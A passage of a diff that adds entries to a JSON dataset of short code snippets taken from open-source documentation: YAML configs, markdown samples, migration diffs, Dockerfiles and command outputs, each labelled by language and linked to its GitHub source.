+    "label": "yaml",
+    "code": "en:\n  devise:\n    sessions:\n      user:\n        signed_in: 'Welcome user, you are signed in.'\n      admin:\n        signed_in: 'Hello admin!'",
+    "tag": "yaml",
+    "source": "https://github.com/heartcombo/devise/blob/05811fb8366edd08874111d0f6fb44543e1c91ef/README.md#L528"
+  },
+  {
+    "label": "yaml",
+    "code": "services:\n  a:\n     image: service_a\n     build: \n       dockerfile: a.Dockerfile\n  b:\n     image: service_b\n     build:\n       dockerfile: b.Dockerfile\n       additional_contexts:\n         # `FROM service_a` will be resolved as a dependency on service \"a\" which has to be built first\n         service_a: \"service:a\"",
+    "tag": "yaml",
+    "source": "https://github.com/docker/docs/blob/1d503f8b7c2b2008da6cbc08bb5be163666c84bf/content/manuals/compose/how-tos/dependent-images.md#L93"
+  },
+  {
+    "label": "yaml",
+    "code": "- uses: shivammathur/setup-php@v2\n  with:\n    php-version: ${{ matrix.php }}\n\n- uses: ramsey/composer-install@v4",
+    "tag": "yaml",
+    "source": "https://github.com/composer/composer/blob/fac7d53f689dee6254f110f3b0104dfa39e607a9/doc/articles/caching.md#L79"
+  },
+  {
+    "label": "yaml",
+    "code": "language: ruby\nrvm:\n  - 2.6.3\n\nbefore_script:\n - chmod +x ./script/cibuild # or do this locally and commit\n\n# Assume bundler is being used, therefore\n# the `install` step will run `bundle install` by default.\nscript: ./script/cibuild\n\n# branch whitelist, only for GitHub Pages\nbranches:\n  only:\n  - gh-pages     # test the gh-pages branch\n  - /pages-(.*)/ # test every branch which starts with \"pages-\"\n\naddons:\n  apt:\n    packages:\n    - libcurl4-openssl-dev\n\ncache: bundler # caching bundler gem packages will speed up build\n\n# Optional: disable email notifications about the outcome of your builds\nnotifications:\n  email: false",
+    "tag": "yaml",
+    "source": "https://github.com/jekyll/jekyll/blob/97c3bdc822df9d5bea4c269b29a28de5a5e29d70/docs/_docs/continuous-integration/travis-ci.md#L90"
+  },
+  {
+    "label": "yaml",
+    "code": "name: My Jekyll Website",
+    "tag": "yaml",
+    "source": "https://github.com/jekyll/jekyll/blob/97c3bdc822df9d5bea4c269b29a28de5a5e29d70/docs/_tutorials/convert-site-to-jekyll.md#L40"
+  },
+  {
+    "label": "yaml",
+    "code": "secret_key_base: 492f...",
+    "tag": "yaml",
+    "source": "https://github.com/rails/rails/blob/a0fd31e1a4e96c80d3184998c956607004fb7f8c/guides/source/security.md#L326"
+  },
+  {
+    "label": "yaml",
+    "code": "webapp:\n  image: examples/web\n  ports:\n    - \"8000:8000\"\n  volumes:\n    - \"/data\"",
+    "tag": "yaml",
+    "source": "https://github.com/docker/docs/blob/1d503f8b7c2b2008da6cbc08bb5be163666c84bf/content/manuals/compose/how-tos/multiple-compose-files/merge.md#L38"
+  },
+  {
+    "label": "yaml",
+    "code": "docs2_list_title: ACME Documentation\ndocs2:\n\n- title: Introduction\n  url: introduction.html\n  version: 1\n\n- title: Configuration\n  url: configuration.html\n  version: 1\n\n- title: Deployment\n  url: deployment.html\n  version: 2",
+    "tag": "yaml",
+    "source": "https://github.com/jekyll/jekyll/blob/97c3bdc822df9d5bea4c269b29a28de5a5e29d70/docs/_tutorials/navigation.md#L421"
+  },
+  {
+    "label": "yaml",
+    "code": "variables:\n    - key: APP_ENV\n      value: local\n    - key: FOO\n      value: bar",
+    "tag": "yaml",
+    "source": "https://github.com/laravel/docs/blob/36fa00db57f97d0a5a89c40be7f50ff8b1133327/homestead.md#L521"
+  },
+  {
+    "label": "yaml",
+    "code": "staging ansible_host=192.168.1.50",
+    "tag": "yml",
+    "source": "https://github.com/jbranchaud/til/blob/ae83a39fa8cf4230f23b81e49667e8d6745c7429/devops/aliasing-an-ansible-host.md#L18"
+  },
+  {
+    "label": "yaml",
+    "code": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: my-node-app\nspec:\n  containers:\n  - name: my-node-app\n    image: my-node-app\n    resources:\n      requests:\n        memory: \"400Mi\"\n      limits:\n        memory: \"500Mi\"\n    command: [\"node index.js --max-old-space-size=350\"]",
+    "tag": "yml",
+    "source": "https://github.com/goldbergyoni/nodebestpractices/blob/dc3d60c29d5483d9ea99cf261bbd6203516a2ba7/sections/docker/memory-limit.french.md#L29"
+  },
+  {
+    "label": "markdown",
+    "code": "### New breaking change here\n\n- **Who does this affect**:\n- **How to migrate**:\n- **Why make this breaking change**:\n- **Severity (number of people affected x effort)**:",
+    "tag": "md",
+    "source": "https://github.com/sveltejs/svelte/blob/356c8766a024d5982c276e898903fadaceaca960/CONTRIBUTING.md#L152"
+  },
+  {
+    "label": "markdown",
+    "code": "---\nshort_name: ted\nname: Ted Doe\nposition: Writer\n---\nTed has been eating fruit since he was baby.",
+    "tag": "markdown",
+    "source": "https://github.com/jekyll/jekyll/blob/97c3bdc822df9d5bea4c269b29a28de5a5e29d70/docs/_docs/step-by-step/09-collections.md#L46"
+  },
+  {
+    "label": "markdown",
+    "code": "# Hello, *Mercury*!",
+    "tag": "markdown",
+    "source": "https://github.com/remarkjs/remark/blob/1146b3a274fc1f4607111e5d6607a3a769a0e89a/readme.md#L70"
+  },
+  {
+    "label": "markdown",
+    "code": "Short summary (ideally 50 characters or less)\n\nMore detailed description, if necessary. Each line should wrap at\n72 characters. Try to be as descriptive as you can. Even if you\nthink that the commit content is obvious, it may not be obvious\nto others. Add any description that is already present in the\nrelevant issues; it should not be necessary to visit a webpage\nto check the history.\n\nThe description section can have multiple paragraphs.\n\nCode examples can be embedded by indenting them with 4 spaces:\n\n    class ArticlesController\n      def index\n        render json: Article.limit(10)\n      end\n    end\n\nYou can also add bullet points:\n\n- make a bullet point by starting a line with either a dash (-)\n  or an asterisk (*)\n\n- wrap lines at 72 characters, and indent any additional lines\n  with 2 spaces for readability",
+    "tag": "markdown",
+    "source": "https://github.com/rails/rails/blob/a0fd31e1a4e96c80d3184998c956607004fb7f8c/guides/source/contributing_to_ruby_on_rails.md#L757"
+  },
+  {
+    "label": "markdown",
+    "code": "> [!NOTE]\n> This PR description was generated with GitHub Copilot.",
+    "tag": "markdown",
+    "source": "https://github.com/App-vNext/Polly/blob/62e7a8c00daf93d361b63d8c9c3f0b0d2e2283a6/AGENTS.md#L109"
+  },
+  {
+    "label": "markdown",
+    "code": "---\nlayout: post\nauthor: jill\n---\nAn apple is a sweet, edible fruit produced by an apple tree.\n\nApple trees are cultivated worldwide, and are the most widely grown\nspecies in the genus Malus. The tree originated in Central Asia, where\nits wild ancestor, Malus sieversii, is still found today. Apples have\nbeen grown for thousands of years in Asia and Europe, and were brought\nto North America by European colonists.",
+    "tag": "markdown",
+    "source": "https://github.com/jekyll/jekyll/blob/97c3bdc822df9d5bea4c269b29a28de5a5e29d70/docs/_docs/step-by-step/08-blogging.md#L112"
+  },
+  {
+    "label": "markdown",
+    "code": "[![Mentioned in Awesome Go](https://awesome.re/mentioned-badge.svg)](https://github.com/avelino/awesome-go)\n[![Mentioned in Awesome Go](https://awesome.re/mentioned-badge-flat.svg)](https://github.com/avelino/awesome-go)",
+    "tag": "md",
+    "source": "https://github.com/avelino/awesome-go/blob/be87bc4b73447b87438ad8434032d3abce59ad02/CONTRIBUTING.md#L179"
+  },
+  {
+    "label": "markdown",
+    "code": "This is a list:\n* first item\n* second item",
+    "tag": "markdown",
+    "source": "https://github.com/jekyll/jekyll/blob/97c3bdc822df9d5bea4c269b29a28de5a5e29d70/docs/_tutorials/orderofinterpretation.md#L62"
+  },
+  {
+    "label": "markdown",
+    "code": "Use <xref:Orleans.Runtime.IPersistentState`1> for persistent grain state.\n\nConfigure it with <xref:Orleans.Hosting.AzureTableSiloBuilderExtensions.AddAzureTableGrainStorage*?displayProperty=nameWithType>.",
+    "tag": "markdown",
+    "source": "https://github.com/dotnet/orleans/blob/4e5cf18946f71ba238dfcf621f639c388005d619/docs/AGENTS.md#L41"
+  },
+  {
+    "label": "markdown",
+    "code": "- [pypi-name](https://github.com/owner/repo) - Description ending with period.",
+    "tag": "markdown",
+    "source": "https://github.com/vinta/awesome-python/blob/8c385dcab9b1a7b6029a6ecb7c5b1f52597fd418/CONTRIBUTING.md#L52"
+  },
+  {
+    "label": "markdown",
+    "code": "- [Issue triage for #20477: Example issue](codex://threads/<id>)\n- [Bug reproduction for #20477: Example issue](codex://threads/<id>)",
+    "tag": "markdown",
+    "source": "https://github.com/astral-sh/uv/blob/1cd8cf12bd622f2815406f29e3168d7f052bf1b3/.codex/skills/load-github-action-thread/SKILL.md#L82"
+  },
+  {
+    "label": "markdown",
+    "code": "# Uranus\n\n**Uranus** is the seventh [planet](/wiki/Planet \"Planet\") from the Sun and is a gaseous cyan [ice giant](/wiki/Ice_giant \"Ice giant\").",
+    "tag": "markdown",
+    "source": "https://github.com/remarkjs/remark/blob/1146b3a274fc1f4607111e5d6607a3a769a0e89a/packages/remark-stringify/readme.md#L116"
+  },
+  {
+    "label": "diff",
+    "code": "- <input {...register('test', { validate: (data: string) => {}, valueAsNumber: true })} />\n+ <input {...register('test', { validate: (data: number) => {}, valueAsNumber: true })} />",
+    "tag": "diff",
+    "source": "https://github.com/react-hook-form/react-hook-form/blob/ed9345ab9c199cb37afbb6ef73970cf697f4585d/CHANGELOG.md#L1812"
+  },
+  {
+    "label": "diff",
+    "code": "// note: this is done in two places in the default migration file, so edit both places:\n-  $table->unsignedBigInteger($columnNames['model_morph_key'])\n+  $table->uuid($columnNames['model_morph_key'])",
+    "tag": "diff",
+    "source": "https://github.com/spatie/laravel-permission/blob/a8930875b85538b49b50106fa24654586d689fb4/docs/advanced-usage/uuid.md#L20"
+  },
+  {
+    "label": "diff",
+    "code": "- import { handle } from 'hono/aws-lambda'\n+ import { handle } from '@hono/aws-lambda'",
+    "tag": "diff",
+    "source": "https://github.com/honojs/hono/blob/5ca49b0720755c585c9a9835f0a479ceea36fb52/adapters/aws-lambda/README.md#L13"
+  },
+  {
+    "label": "diff",
+    "code": "-<%= link_to \"New product\", new_product_path if authenticated? %>",
+    "tag": "diff",
+    "source": "https://github.com/rails/rails/blob/a0fd31e1a4e96c80d3184998c956607004fb7f8c/guides/source/sign_up_and_settings.md#L1317"
+  },
+  {
+    "label": "diff",
+    "code": "  # Raise an error on page load if there are pending migrations.\n-  # config.active_record.migration_error = :page_load\n+  config.active_record.migration_error = false",
+    "tag": "diff",
+    "source": "https://github.com/jbranchaud/til/blob/ae83a39fa8cf4230f23b81e49667e8d6745c7429/rails/rollback-a-couple-migrations.md#L21"
+  },
+  {
+    "label": "diff",
+    "code": "- impl NonAggregate for MyQueryNode {}\n+ impl ValidGrouping<()> for MyQueryNode {\n+    type IsAggregate = is_aggregate::No;\n+ }",
+    "tag": "diff",
+    "source": "https://github.com/diesel-rs/diesel/blob/3234c902355149cb8f6ea7c0bd8857d8a5c90f27/guide_drafts/migration_guide.md#L219"
+  },
+  {
+    "label": "diff",
+    "code": "// Zod 3 \n- z.string({\n-   errorMap: (issue, ctx) => {\n-     if (issue.code === \"too_small\") {\n-       return { message: `Value must be >${issue.minimum}` };\n-     }\n-     return { message: ctx.defaultError };\n-   },\n- });\n\n// Zod 4\n+ z.string({\n+   error: (issue) => {\n+     if (issue.code === \"too_small\") {\n+       return `Value must be >${issue.minimum}`\n+     }\n+   },\n+ });",
+    "tag": "diff",
+    "source": "https://github.com/colinhacks/zod/blob/afdac65e0f80c0ccf9e8909da97c411567908b57/packages/docs/content/v4/index.mdx#L806"
+  },
+  {
+    "label": "diff",
+    "code": "- ## HEAD\n+ ## 3.7.1 / 2018-01-25",
+    "tag": "diff",
+    "source": "https://github.com/jekyll/jekyll/blob/97c3bdc822df9d5bea4c269b29a28de5a5e29d70/docs/_docs/maintaining/releasing-a-new-version.md#L66"
+  },
+  {
+    "label": "diff",
+    "code": "$DIFF",
+    "tag": "diff",
+    "source": "https://github.com/jekyll/jekyll/blob/97c3bdc822df9d5bea4c269b29a28de5a5e29d70/.github/first-timers-issue-template.md#L24"
+  },
+  {
+    "label": "diff",
+    "code": "- import { serveStatic } from 'hono/deno'\n+ import { serveStatic } from '@hono/deno'",
+    "tag": "diff",
+    "source": "https://github.com/honojs/hono/blob/5ca49b0720755c585c9a9835f0a479ceea36fb52/adapters/deno/README.md#L15"
+  },
+  {
+    "label": "diff",
+    "code": "- import { serveStatic } from 'hono/cloudflare-workers'\n+ import { serveStatic } from '@hono/cloudflare-workers'",
+    "tag": "diff",
+    "source": "https://github.com/honojs/hono/blob/5ca49b0720755c585c9a9835f0a479ceea36fb52/adapters/cloudflare-workers/README.md#L13"
+  },
+  {
+    "label": "diff",
+    "code": "- axios.interceptors.request.use((config: AxiosRequestConfig) => {\n+ axios.interceptors.request.use((config: InternalAxiosRequestConfig) => {\n    return config;\n  });",
+    "tag": "diff",
+    "source": "https://github.com/axios/axios/blob/aa54a5e1e0e50cd1a2561b854ae5490ff589d065/docs/zh/pages/getting-started/upgrade-guide.md#L30"
+  },
+  {
+    "label": "dockerfile",
+    "code": "COPY . .\nRUN npm run build",
+    "tag": "dockerfile",
+    "source": "https://github.com/goldbergyoni/nodebestpractices/blob/dc3d60c29d5483d9ea99cf261bbd6203516a2ba7/sections/docker/use-cache-for-shorter-build-time.md#L49"
+  },
+  {
+    "label": "dockerfile",
+    "code": "RUN uv python install --compile-bytecode\nRUN uv sync --compile-bytecode",
+    "tag": "dockerfile",
+    "source": "https://github.com/astral-sh/uv/blob/1cd8cf12bd622f2815406f29e3168d7f052bf1b3/docs/guides/integration/docker.md#L327"
+  },
+  {
+    "label": "dockerfile",
+    "code": "RUN deluser --remove-home node \\\n  && addgroup -S node -g 999 \\\n  && adduser -S -G node -u 999 node",
+    "tag": "dockerfile",
+    "source": "https://github.com/nodejs/docker-node/blob/84410eeaede25daf49826da8265fbf548cc604fe/docs/BestPractices.md#L115"
+  },
+  {
+    "label": "dockerfile",
+    "code": "FROM alpine\nADD https://github.com/example/todo-app.git /src",
+    "tag": "dockerfile",
+    "source": "https://github.com/docker/docs/blob/1d503f8b7c2b2008da6cbc08bb5be163666c84bf/content/manuals/build/building/secrets.md#L213"
+  },
+  {
+    "label": "dockerfile",
+    "code": "# syntax=docker/dockerfile:1\n\nFROM scratch AS src\nARG DOTNET_VERSION=8.0.0-preview.6.23329.7\nADD --checksum=sha256:270d731bd08040c6a3228115de1f74b91cf441c584139ff8f8f6503447cebdbb \\\n    https://dotnetcli.azureedge.net/dotnet/Runtime/$DOTNET_VERSION/dotnet-runtime-$DOTNET_VERSION-linux-arm64.tar.gz /dotnet.tar.gz\n\nFROM mcr.microsoft.com/dotnet/runtime-deps:8.0.0-preview.6-bookworm-slim-arm64v8 AS installer\n\n# Retrieve .NET Runtime\nRUN --mount=from=src,target=/src <<EOF\nmkdir -p /dotnet\ntar -oxzf /src/dotnet.tar.gz -C /dotnet\nEOF\n\nFROM mcr.microsoft.com/dotnet/runtime-deps:8.0.0-preview.6-bookworm-slim-arm64v8\n\nCOPY --from=installer /dotnet /usr/share/dotnet\nRUN ln -s /usr/share/dotnet/dotnet /usr/bin/dotnet",
+    "tag": "dockerfile",
+    "source": "https://github.com/docker/docs/blob/1d503f8b7c2b2008da6cbc08bb5be163666c84bf/content/manuals/build/building/best-practices.md#L642"
+  },
+  {
+    "label": "dockerfile",
+    "code": "# Latest release\nCOPY --from=composer/composer:latest-bin /composer /usr/bin/composer\n\n# Specific release\nCOPY --from=composer/composer:2-bin /composer /usr/bin/composer",
+    "tag": "dockerfile",
+    "source": "https://github.com/composer/composer/blob/fac7d53f689dee6254f110f3b0104dfa39e607a9/doc/00-intro.md#L184"
+  },
+  {
+    "label": "dockerfile",
+    "code": "FROM node:lts\nENV NPM_CONFIG_LOGLEVEL=info\n...",
+    "tag": "dockerfile",
+    "source": "https://github.com/nodejs/docker-node/blob/84410eeaede25daf49826da8265fbf548cc604fe/README.md#L126"
+  },
+  {
+    "label": "dockerfile",
+    "code": "ENTRYPOINT [\"myapp\"]",
+    "tag": "dockerfile",
+    "source": "https://github.com/GoogleContainerTools/distroless/blob/682887a32ccb0740a70c645019d2582837900dcb/README.md#L71"
+  },
+  {
+    "label": "dockerfile",
+    "code": "FROM --platform=linux/amd64 ghcr.io/astral-sh/uv:0.13.5-debian-slim\n\nRUN uv init /mre\nWORKDIR /mre\nRUN uv add pydantic\nRUN uv sync\nRUN uv run -v python -c \"import pydantic\"",
+    "tag": "dockerfile",
+    "source": "https://github.com/astral-sh/uv/blob/1cd8cf12bd622f2815406f29e3168d7f052bf1b3/docs/reference/troubleshooting/reproducible-examples.md#L68"
+  },
+  {
+    "label": "dockerfile",
+    "code": "# hadolint global ignore=DL3003,DL3006,SC1035 # We accept these issues, because ...\nFROM ubuntu\n\nRUN cd /tmp && echo \"foo\"",
+    "tag": "dockerfile",
+    "source": "https://github.com/hadolint/hadolint/blob/1d901b9c0b0d0445d19b1a9128d89fa55bb4604e/README.md#L378"
+  },
+  {
+    "label": "dockerfile",
+    "code": "FROM ghcr.io/astral-sh/uv:0.13.5 AS uv\n\n# First, bundle the dependencies into the task root.\nFROM public.ecr.aws/lambda/python:3.13 AS builder\n\n# Enable bytecode compilation, to improve cold-start performance.\nENV UV_COMPILE_BYTECODE=1\n\n# Disable installer metadata, to create a deterministic layer.\nENV UV_NO_INSTALLER_METADATA=1\n\n# Enable copy mode to support bind mount caching.\nENV UV_LINK_MODE=copy\n\n# Bundle the dependencies into the Lambda task root via `uv pip install --target`.\n#\n# Omit any local packages (`--no-emit-workspace`) and development dependencies (`--no-dev`).\n# This keeps the layer cached across changes to the application code or `pyproject.toml`, as long as\n# `uv.lock` is unchanged.\nRUN --mount=from=uv,source=/uv,target=/bin/uv \\\n    --mount=type=cache,target=/root/.cache/uv \\\n    --mount=type=bind,source=uv.lock,target=uv.lock \\\n    uv export --frozen --no-emit-workspace --no-dev --no-editable -o requirements.txt && \\\n    uv pip install -r requirements.txt --target \"${LAMBDA_TASK_ROOT}\"\n\nFROM public.ecr.aws/lambda/python:3.13\n\n# Copy the runtime dependencies from the builder stage.\nCOPY --from=builder ${LAMBDA_TASK_ROOT} ${LAMBDA_TASK_ROOT}\n\n# Copy the application code.\nCOPY ./app ${LAMBDA_TASK_ROOT}/app\n\n# Set the AWS Lambda handler.\nCMD [\"app.main.handler\"]",
+    "tag": "dockerfile",
+    "source": "https://github.com/astral-sh/uv/blob/1cd8cf12bd622f2815406f29e3168d7f052bf1b3/docs/guides/integration/aws-lambda.md#L94"
+  },
+  {
+    "label": "dockerfile",
+    "code": "(paste content of your Dockerfile)",
+    "tag": "dockerfile",
+    "source": "https://github.com/hadolint/hadolint/blob/1d901b9c0b0d0445d19b1a9128d89fa55bb4604e/.github/ISSUE_TEMPLATE.md#L29"
+  },
+  {
+    "label": "plaintext",
+    "code": "C:\\working> dotnet new uninstall\nCurrently installed items:\n... cut to save space ...\n\n  AdatumCorporation.Utility.Templates\n    Details:\n      NuGetPackageId: AdatumCorporation.Utility.Templates\n      Version: 1.0.0\n      Author: Me\n    Templates:\n      Example templates: async project (consoleasync) C#\n      Example templates: string extensions (stringext) C#\n    Uninstall Command:\n      dotnet new uninstall AdatumCorporation.Utility.Templates",
+    "tag": "output",
+    "source": "https://github.com/dotnet/docs/blob/22dffe78e3542278c89cf2c2724be8f8272001dd/docs/core/tutorials/cli-templates-create-template-package.md#L189"
+  },
+  {
+    "label": "plaintext",
+    "code": "// .gitattributes\n/demo export-ignore\nphpunit.xml.dist export-ignore\n/.github/ export-ignore\n/composer.lock export-ignore",
+    "tag": "text",
+    "source": "https://github.com/composer/composer/blob/fac7d53f689dee6254f110f3b0104dfa39e607a9/doc/02-libraries.md#L176"
+  },
+  {
+    "label": "plaintext",
+    "code": "pyproject.toml\nsrc\n└── foo\n    └── bar\n        └── __init__.py",
+    "tag": "text",
+    "source": "https://github.com/astral-sh/uv/blob/1cd8cf12bd622f2815406f29e3168d7f052bf1b3/docs/concepts/build-backend.md#L106"
+  },
+  {
+    "label": "plaintext",
+    "code": "Description:\n  A simple task tracker CLI\n\nUsage:\n  TaskCli [command] [options]\n\nOptions:\n  --verbose       Show detailed output\n  -?, -h, --help  Show help and usage information\n  --version       Show version information\n\nCommands:\n  add <description>  Add a new task\n  list               List all tasks\n  complete <id>      Mark a task as complete\n  remove <id>        Remove a task",
+    "tag": "output",
+    "source": "https://github.com/dotnet/docs/blob/22dffe78e3542278c89cf2c2724be8f8272001dd/docs/csharp/fundamentals/tutorials/system-command-line.md#L182"
+  },
+  {
+    "label": "plaintext",
+    "code": "doctrine/cache        v1.6.0 requires php (~5.5|~7.0)\ndoctrine/common       v2.6.1 requires php (~5.5|~7.0)\ndoctrine/instantiator 1.0.5  requires php (>=5.3,<8.0-DEV)",
+    "tag": "text",
+    "source": "https://github.com/composer/composer/blob/fac7d53f689dee6254f110f3b0104dfa39e607a9/doc/03-cli.md#L760"
+  },
+  {
+    "label": "plaintext",
+    "code": "Resilience event occurred. EventName: 'OnFallback', Source: 'MyPipeline/MyPipelineInstance/MyFallbackStrategy', Operation Key: 'MyFallbackGuardedOperation', Result: '-1'\n\nResilience event occurred. EventName: 'OnFallback', Source: '(null)/(null)/Fallback', Operation Key: '', Result: 'Exception of type 'CustomException' was thrown.'\n    CustomException: Exception of type 'CustomException' was thrown.\n        at Program.<>c.<Main>b__0_3(ResilienceContext ctx)\n        ...\n        at Polly.ResiliencePipeline.<>c__8`1.<<ExecuteAsync>b__8_0>d.MoveNext() in /_/src/Polly.Core/ResiliencePipeline.AsyncT.cs:line 95",
+    "tag": "none",
+    "source": "https://github.com/App-vNext/Polly/blob/62e7a8c00daf93d361b63d8c9c3f0b0d2e2283a6/docs/strategies/fallback.md#L85"
+  },
+  {
+    "label": "plaintext",
+    "code": "*RETIRED* interface [GrainInterfaceType(\"Contoso.Grains.ILegacyGrain\")] Contoso.Grains.ILegacyGrain [Version(0)]\n\n*RETIRED* class [GrainType(\"legacy\")] Contoso.Grains.LegacyGrain",
+    "tag": "text",
+    "source": "https://github.com/dotnet/orleans/blob/4e5cf18946f71ba238dfcf621f639c388005d619/docs/site/src/content/docs/grains/grain-versioning/contract-compatibility-analyzer.md#L129"
+  },
+  {
+    "label": "plaintext",
+    "code": "$ ruby -e \"require 'securerandom'; puts SecureRandom.hex(64)\"\n99ae8af...snip...ec0f262ac",
+    "tag": "text",
+    "source": "https://github.com/sinatra/sinatra/blob/cb22afd7902b566b6eaba6c4ea89739494a65d12/README.md#L1202"
+  },
+  {
+    "label": "plaintext",
+    "code": "myproject/\n├── web/\n│   ├── App.jsx\n│   ├── index.js\n│   └── node_modules/\n├── Dockerfile\n├── compose.yaml\n└── package.json",
+    "tag": "text",
+    "source": "https://github.com/docker/docs/blob/1d503f8b7c2b2008da6cbc08bb5be163666c84bf/content/manuals/compose/how-tos/file-watch.md#L132"
+  },
+  {
+    "label": "plaintext",
+    "code": "Resilience event occurred. EventName: 'OnHedging', Source: 'MyPipeline/MyPipelineInstance/Hedging', Operation Key: 'MyHedgingOperation', Result: ''\n\nExecution attempt. Source: 'MyPipeline/MyPipelineInstance/Hedging', Operation Key: 'MyHedgingOperation', Result: '1', Handled: 'False', Attempt: '0', Execution Time: 1505.3839ms\n\nExecution attempt. Source: 'MyPipeline/MyPipelineInstance/Hedging', Operation Key: 'MyHedgingOperation', Result: 'Exception of type 'CustomException' was thrown.', Handled: 'True', Attempt: '1', Execution Time: 1525.2899ms\n    CustomException: Exception of type 'CustomException' was thrown.\n        at Program.<>c.<<Main>b__0_2>d.MoveNext()\n        ...\n        at Polly.ResiliencePipeline.<>c__8`1.<<ExecuteAsync>b__8_0>d.MoveNext() in /_/src/Polly.Core/ResiliencePipeline.AsyncT.cs:line 95",
+    "tag": "none",
+    "source": "https://github.com/App-vNext/Polly/blob/62e7a8c00daf93d361b63d8c9c3f0b0d2e2283a6/docs/strategies/hedging.md#L97"
+  },
+  {
+    "label": "plaintext",
+    "code": "{\n  \"original\": \"https://www.microsoft.com\",\n  \"shortened\": \"http://<container-app-name>.<deployment-name>.<region>.azurecontainerapps.io:<port>/go/<generated-id>\"\n}",
+    "tag": "output",
+    "source": "https://github.com/dotnet/orleans/blob/4e5cf18946f71ba238dfcf621f639c388005d619/docs/site/src/content/docs/quickstarts/deploy-scale-orleans-on-azure.md#L76"
+  },
+  {
+    "label": "plaintext",
+    "code": "Test run for C:\\Source\\dotnet\\docs\\samples\\snippets\\core\\tutorials\\testing-with-cli\\csharp\\test\\NewTypesTests\\bin\\Debug\\net5.0\\NewTypesTests.dll (.NETCoreApp,Version=v5.0)\nMicrosoft (R) Test Execution Command Line Tool Version 16.8.1\nCopyright (c) Microsoft Corporation.  All rights reserved.\n\nStarting test execution, please wait...\nA total of 1 test files matched the specified pattern.\n[xUnit.net 00:00:00.50]     PetTests.DogTalkToOwnerReturnsWoof [FAIL]\n  Failed PetTests.DogTalkToOwnerReturnsWoof [6 ms]\n  Error Message:\n   Assert.NotEqual() Failure\nExpected: Not \"Woof!\"\nActual:   \"Woof!\"\n  Stack Trace:\n     at PetTests.DogTalkToOwnerReturnsWoof() in C:\\Source\\dotnet\\docs\\samples\\snippets\\core\\tutorials\\testing-with-cli\\csharp\\test\\NewTypesTests\\PetTests.cs:line 13\n\nFailed!  - Failed:     1, Passed:     1, Skipped:     0, Total:     2, Duration: 8 ms - NewTypesTests.dll (net5.0)",
+    "tag": "output",
+    "source": "https://github.com/dotnet/docs/blob/22dffe78e3542278c89cf2c2724be8f8272001dd/docs/core/tutorials/testing-with-cli.md#L190"
   }
 ]
